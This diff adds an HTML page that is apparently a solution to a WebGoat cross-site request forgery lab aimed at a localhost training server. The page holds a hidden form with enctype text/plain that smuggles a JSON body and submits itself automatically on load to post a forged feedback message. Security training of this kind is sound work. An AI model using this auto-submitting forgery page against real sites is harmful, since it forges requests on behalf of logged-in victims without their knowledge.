@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+<form name ="attack" action="http://localhost:8081/WebGoat/csrf/feedback/message" enctype="text/plain" method="POST">
+    <input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","message":"WebGoat is the best!!", "ignoreme":"'value='asdsadsa "}'>
+</form>
+ <script>document.attack.submit()</script>
+</body>
+</html>
+
